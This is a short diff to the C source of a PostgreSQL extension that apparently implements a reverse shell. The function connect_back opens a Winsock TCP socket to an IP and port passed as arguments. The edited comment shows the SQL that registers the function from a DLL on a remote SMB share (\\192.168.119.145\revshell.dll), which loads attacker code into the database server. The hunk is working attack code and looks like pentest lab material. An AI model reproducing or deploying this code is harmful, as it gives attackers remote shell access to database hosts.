@@ -39,7 +39,7 @@ connect_back(PG_FUNCTION_ARGS)
 	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
   /* IP and port come from arguments */
-  /* amdb=# create or replace function revshell(text, integer) returns void as $$\\192.168.119.145\revshell.dll$$, $$revshell$$ LANGUAGE C STRICT;
+  /* amdb=# create or replace function revshell(text, integer) returns void as $$\\192.168.119.145\revshell.dll$$, $$connect_back$$ LANGUAGE C STRICT;*/
 	hax.sin_family = AF_INET;
 	hax.sin_port = htons(PG_GETARG_INT32(1));
 	hax.sin_addr.s_addr = GET_STR(PG_GETARG_TEXT_P(0));
